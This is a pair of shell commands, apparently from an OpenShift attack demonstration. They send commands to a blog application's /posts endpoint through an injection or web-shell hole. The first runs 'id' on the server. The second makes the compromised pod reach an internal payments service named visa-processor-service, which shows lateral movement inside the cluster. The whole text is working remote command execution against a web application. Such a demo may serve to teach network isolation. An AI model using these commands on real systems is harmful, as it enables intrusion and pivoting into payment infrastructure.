wget -q -O - --post-data 'cmd=id' https://$(oc -n frontend get route/blog --output jsonpath={.spec.host})/posts

echo "Connecting to VISA-PROCESSOR.." && wget -q -O - --post-data 'cmd=wget -O - http://visa-processor-service.payments:8080' https://$(oc -n frontend get route/blog --output jsonpath={.spec.host})/posts
